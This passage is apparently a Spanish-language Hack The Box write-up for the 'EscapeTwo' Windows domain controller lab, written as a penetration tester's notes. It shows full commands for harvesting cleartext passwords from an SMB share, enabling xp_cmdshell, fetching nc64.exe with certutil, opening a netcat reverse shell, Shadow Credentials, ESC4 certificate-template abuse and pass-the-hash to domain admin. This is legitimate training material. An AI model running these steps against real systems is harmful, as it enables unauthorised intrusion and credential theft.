SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su

/home/kali/Documents/htb/machines/escapetwo:-$ echo '10.10.11.51\tsequel.htb\tdc01.sequel.htb' | sudo tee -a /etc/hosts
```

---
## Data Leak Exploitation

Enumero los recursos compartidos SMB disponibles para el usuario `rose`.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
```

Accedo al recurso `Accounting Department` y recupero dos archivos Excel.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ smbclient //10.10.11.51/Accounting\ Department -U 'rose%KxEPkKe6R8su' 
smb: \> dir
  .                                   D        0  Sun Jun  9 07:52:21 2024
  ..                                  D        0  Sun Jun  9 07:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 07:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 07:52:07 2024

smb: \> get accounts.xlsx

/home/kali/Documents/htb/machines/escapetwo:-$ file accounts.xlsx
accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
```

Al inspeccionar el contenido de los archivos encunetro que `sharedStrings.xml` contiene nombres, usuarios y contraseñas en texto claro.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ grep -rl '@sequel.htb' ./
./xl/worksheets/sheet1.xml
./xl/worksheets/_rels/sheet1.xml.rels
./xl/sharedStrings.xml

/home/kali/Documents/htb/machines/escapetwo:-$ cat xl/sharedStrings.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>

/home/kali/Documents/htb/machines/escapetwo:-$ cat xl/sharedStrings.xml | grep -oP '<t.*?>\K.*?(?=</t>)' | awk 'ORS=NR%5?",":"\n"' | column -t -s, 
First Name  Last Name      Email              Username        Password
Angela      Martin         angela@sequel.htb  angela          0fwz7Q4mSpurIt99
Oscar       Martinez       oscar@sequel.htb   oscar           86LxLBMgEWaKUnBG
Kevin       Malone         kevin@sequel.htb   kevin           Md9Wlq1E5bZnVDVo
NULL        sa@sequel.htb  sa                 MSSQLP@ssw0rd! 
```

La contraseña para el usuario `sa` es valida para autenticarse exitosamente en el servicio MSSQL.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (admin)
```

---
## Misconfiguration Exploitation

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ mssqlclient.py sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (sa  dbo@master)> SELECT DB_NAME() AS CurrentDatabase;
CurrentDatabase
---------------   
master
```

El servidor responde como `DC01\SQLEXPRESS` sobre la base de datos `master`.

La opción `xp_cmdshell` se encuentra deshabilitada, esta opción de SQL Server permite ejecutar comandos directamente desde consultas SQL. Puedo habilitar su uso mediante la instrucción `sp_configure`, seguida de `RECONFIGURE`.

```terminal
SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell';
name          minimum   maximum   config_value   run_value
-----------   -------   -------   ------------   ---------
xp_cmdshell         0         1              0           0

SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@master)> RECONFIGURE;

SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell';
name          minimum   maximum   config_value   run_value
-----------   -------   -------   ------------   ---------
xp_cmdshell         0         1              1           1

SQL (sa  dbo@master)> EXEC xp_cmdshell whoami
output
--------------   
sequel\sql_svc

NULL
```

Una vez habilitada la ejecución de comandos, preparo el entorno para obtener una reverse shell.

Descargo netcat a la maquina victima desde mi servidor HTTP local.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ git clone https://github.com/int0x33/nc.exe.git

/home/kali/Documents/htb/machines/escapetwo:-$ python3 -m http.server -d /nc.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

SQL (sa  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.15.88:8000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
```

Lanzo un listener y ejecuto el netcat mediante `xp_cmdshell`, solicitando una conexión inversa a mi máquina.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ nc -nvlp 443
	listening on [any] 9001 ...

SQL (sa  dbo@master)> EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.15.88 443';

	... connect to [10.10.15.88] from (UNKNOWN) [10.10.11.51] 58531

C:\Windows\system32>whoami
sequel\sql_svc
```

---
## Lateral Movement

Listo los usuarios disponibles en el sistema y confirmo la presencia de varias cuentas del dominio `sequel.htb`.

```powershell
C:\>net user
User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            ca_svc                   Guest                    
krbtgt                   michael                  oscar                    
rose                     ryan                     sql_svc
```

Al explorar el directorio raíz `C:\`, encuentro la carpeta SQL2019, que contiene archivos de instalación de SQL Server. Entre ellos identifico `sql-Configuration.INI`, un archivo de configuración generado durante la instalación. Examino su contenido y encuentro parámetros sensibles, incluyendo la cuenta de servicio `SEQUEL\sql_svc` y su contraseña `WqSZAF6CysDQbGb3`.

```powershell
C:\>type SQL2019\ExpressAdv_ENU\sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Utilizo nxc para probar las credenciales contra el servicio WinRM, apuntando al host `sequel.htb` como el usuario `ryan`. La autenticación resulta exitosa y confirma privilegios de administrador.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ nxc winrm sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (admin)
```

Establezco una sesión usando evil-winrm y accedo como usuario `ryan`.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ evil-winrm -i 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
sequel\ryan

*Evil-WinRM* PS C:\Users\ryan> type Desktop\user.txt
```

---
## Privilege Escalation

Con las credenciales de ryan, ejecuto bloodhound-python para recolectar información del DC.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c all --zip
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 34S
INFO: Compressing output into 20250528184956_bloodhound.zip
```

Analizando la base de datos en BloodHound, detecto que el usuario `ryan` posee la propiedad `WriteOwner` sobre el usuario `ca_svc`.

![](assets/img/htb-writeup-escapetwo/escapetwo1_1.png)

Esta derecho otorga a `ryan` la capacidad de tomar el control total del objeto `ca_svc`, permitiendo cambiar su propiedad, otorgarse privilegios o incluso establecer una contraseña arbitraria. Este control es suficiente para ejecutar un Shadow Credentials Attack.

![](assets/img/htb-writeup-escapetwo/escapetwo1_2.png)

Consultando las propiedades de `ca_svc`, identifico que es miembro del grupo `CERT PUBLISHERS`. Según la descripción del grupo: “Members of this group are permitted to publish certificates to the directory”

Este rol confirma que el usuario tiene privilegios sobre la infraestructura de certificados del dominio, lo cual sugiere que Active Directory Certificate Services está configurado.

![](assets/img/htb-writeup-escapetwo/escapetwo1_3.png)

---

Con bloodyAD, configuro a `ryan` como nuevo propietario del objeto `ca_svc`.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```

Luego, utilizo dacledit para otorgar a `ryan` control total `FullControl` sobre el objeto.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250528-193340.bak
[*] DACL modified successfully!
```

Con estos permisos ejecuto el ataque Shadow Credentials sobre `ca_svc`.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51' 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '75b2c0eb-9c5f-7b39-28a7-ca22a4f4f4b8'
[*] Adding Key Credential with device ID '75b2c0eb-9c5f-7b39-28a7-ca22a4f4f4b8' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '75b2c0eb-9c5f-7b39-28a7-ca22a4f4f4b8' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

Esto genera un certificado válido asociado al objeto `ca_svc`, utilizado para solicitar un TGT vía Kerberos y devuelve el hash NT del usuario comprometido.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ export KRB5CCNAME=ca_svc.ccache
```

Exporto el cache Kerberos obtenido durante el ataque de Shadow Credentials para operar como `ca_svc`. Luego, enumero plantillas vulnerables en la CA con Certipy.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ certipy find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)
                                                                                                                                          
[+] Domain retrieved from CCache: SEQUEL.HTB
[+] Username retrieved from CCache: ca_svc
[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
[+] Authenticating to LDAP server
[+] Using Kerberos Cache: ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/dc01.sequel.htb'
[+] Got TGS for 'host/dc01.sequel.htb'
[+] Bound to ldap://10.10.11.51:389 - cleartext
[+] Default path: DC=sequel,DC=htb
[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)
     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)
     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)
     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)
     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)
     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)
     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)
     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.10.11.51
[+] Using Kerberos Cache: ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - Gene
ral access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[+] Using Kerberos Cache: ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)
[*] Got CA configuration for 'sequel-DC01-CA'
[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51
[+] Connecting to 10.10.11.51:80
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication 
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

El análisis revela que la plantilla `DunderMifflinAuthentication` está habilitada y vulnerable a `ESC4`. El grupo `Cert Publishers`, al cual pertenece `ca_svc`, posee permisos de `Full Control` sobre dicha plantilla, esto permite modificar los atributos de la plantilla para [abusar del certificado esc4](https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4) resultante y escalar privilegios.

Modifico los parámetros de la plantilla vulnerable `DunderMifflinAuthentication` para permitir solicitar un certificado con UPN arbitrario.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

Con la plantilla modificada, emito un certificado usando el UPN de `administrator@sequel.htb`.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: '10.10.11.51'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```

El certificado y clave privada se guardan en `administrator_10.pfx`.

Uso el certificado generado para solicitar un TGT como `administrator@sequel.htb` y obtener sus credenciales Kerberos.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ certipy auth -pfx administrator_10.pfx -domain sequel.htb 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

El proceso devuelve un TGT válido y el NT hash de `Administrator`. Mediante Pass-the-Hash accedo como `administrator`, comprometiendo completamente el dominio.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/642" target="_blank">Escapetwo Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }

